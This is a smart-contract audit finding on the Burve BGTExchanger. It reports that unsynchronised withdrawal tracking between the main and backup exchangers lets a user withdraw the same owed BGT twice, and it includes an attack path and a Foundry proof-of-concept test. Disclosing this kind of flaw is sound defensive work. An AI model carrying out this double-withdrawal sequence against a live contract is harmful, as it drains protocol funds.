# Unsynchronized Withdrawals Allow Double Spending in BGTExchanger Contracts

### Summary

**Lack of synchronization between main and backup exchanger will cause a double withdrawal vulnerability for the BGTExchanger contract as users will withdraw the same owed tokens from both contracts independently.**

### Root Cause

In `[BGTExchanger.sol:72-87](https://github.com/sherlock-audit/2025-04-burve/blob/main/Burve/src/integrations/BGTExchange/BGTExchanger.sol#L72-L87)` the `withdraw` function updates only the local contract's `withdrawn` state while the `getOwed` function aggregates owed amounts from both contracts:

```solidity
function getOwed(address caller) public view returns (uint256 _owed) {
    _owed = owed[caller];
    if (address(backupEx) != address(0)) {
        _owed += backupEx.getOwed(caller);
    }
    _owed -= withdrawn[caller];
}

function withdraw(address recipient, uint256 bgtAmount) external {
    uint256 _owed = getOwed(msg.sender);
    if (bgtAmount == 0) return;
    if (_owed < bgtAmount) revert InsufficientOwed();
    withdrawn[msg.sender] += bgtAmount;
    TransferHelper.safeTransfer(bgtToken, recipient, bgtAmount);
}
```

### Internal Pre-conditions

1. Owner needs to call `setBackup()` to set a valid backup exchanger contract.
2. User needs to be added as an exchanger in both main and backup contracts via `addExchanger()`.
3. Both main and backup contracts need to have BGT tokens funded via the `fund()` function.
4. User needs to have exchanged tokens in either or both contracts to have an owed balance.
5. Main contract's `getOwed()` function successfully returns the combined owed amount from both contracts.

### External Pre-conditions

None

### Attack Path

1. **User calls `exchange()` on the main contract to have tokens owed to them.**
2. **User calls `exchange()` on the backup contract to have additional tokens owed to them.**
3. **User calls `withdraw()` on the main contract to withdraw the combined owed amount (from both main and backup).**
4. **User calls `withdraw()` directly on the backup contract to withdraw the same amount owed by the backup again.**
5. **The user has now received more BGT tokens than they should have been entitled to.**


### Impact

**The protocol suffers a loss equal to the total amount owed by the backup contract. The attacker gains this amount in BGT tokens by double withdrawing.**

For instance, if a user is owed 100 BGT from the main contract and 100 BGT from the backup contract, they can withdraw 200 BGT from the main contract and then another 100 BGT from the backup contract, resulting in a 100 BGT loss for the protocol.


### PoC

The provided test case confirms the issue: add it the `BGTExchanger.t.sol`

```solidity
function testDoubleSpendingVulnerability() public {
    // Create owner account
    address owner = makeAddr("owner");
    
    // Deploy mainEx and backupEx as owner
    vm.startPrank(owner);
    BGTExchanger mainEx = new BGTExchanger(address(ibgt));
    BGTExchanger backupEx = new BGTExchanger(address(ibgt));
    vm.stopPrank();
    
    // Set backupEx as the backup of mainEx (as owner)
    vm.prank(owner);
    mainEx.setBackup(address(backupEx));
    
    // Add alice as exchanger in both (as owner)
    vm.prank(owner);
    mainEx.addExchanger(alice);
    vm.prank(owner);
    backupEx.addExchanger(alice);
    
    // Set rates for usdc (as owner)
    uint256 rate = (1e12 << 128); // 1e6 usdc => 1e18 ibgt
    vm.prank(owner);
    mainEx.setRate(address(usdc), rate);
    vm.prank(owner);
    backupEx.setRate(address(usdc), rate);
    
    // Fund both contracts with BGT
    deal(address(ibgt), address(this), 20e18);
    ibgt.approve(address(mainEx), 10e18);
    mainEx.fund(10e18);
    ibgt.approve(address(backupEx), 10e18);
    backupEx.fund(10e18);
    
    // Have alice exchange on backupEx for 10e6 usdc
    vm.startPrank(alice);
    deal(address(usdc), alice, 10e6);
    usdc.approve(address(backupEx), 10e6);
    (uint256 bgtAmount, uint256 spendAmount) = backupEx.exchange(
        address(usdc),
        10e6
    );
    assertEq(bgtAmount, 10e18, "bgtAmount backupEx");
    assertEq(spendAmount, 10e6, "spendAmount backupEx");
    vm.stopPrank();
    
    // VERIFY: The amount owed to Alice is properly tracked
    assertEq(mainEx.getOwed(alice), 10e18, "getOwed mainEx reflects backupEx exchange");
    assertEq(backupEx.getOwed(alice), 10e18, "getOwed backupEx");
    
    // STEP 1: Alice withdraws from the mainEx
    vm.startPrank(alice);
    mainEx.withdraw(alice, 10e18);
    assertEq(ibgt.balanceOf(alice), 10e18, "alice ibgt after first withdraw");
    assertEq(mainEx.withdrawn(alice), 10e18, "withdrawn mainEx");
    
    // VERIFY: After withdrawing from mainEx, the getOwed should be 0 since Alice got everything
    assertEq(mainEx.getOwed(alice), 0, "getOwed mainEx after withdrawal");
    
    // VULNERABILITY: But she can still withdraw from backupEx directly!
    // mainEx.withdrawn is updated but backupEx.withdrawn is not synced
    backupEx.withdraw(alice, 10e18);
    
    // RESULT: Alice was able to withdraw 20e18 total when she was only owed 10e18
    assertEq(ibgt.balanceOf(alice), 20e18, "alice ibgt after both withdraws (DOUBLE SPEND!)");
    assertEq(backupEx.withdrawn(alice), 10e18, "withdrawn backupEx");
    
    vm.stopPrank();
    
    // This test passing confirms the double spending vulnerability exists
    // The vulnerability allows withdrawing the same funds from both the main and backup exchangers
    // The root cause: Each exchanger tracks its own 'withdrawn' amount separately
    // without synchronizing with the other exchanger
}
```

### Mitigation

Implement a system where withdrawals are tracked globally across both contracts (main and backup). This ensures that once a user withdraws their owed tokens, they cannot withdraw the same amount again from another contract.
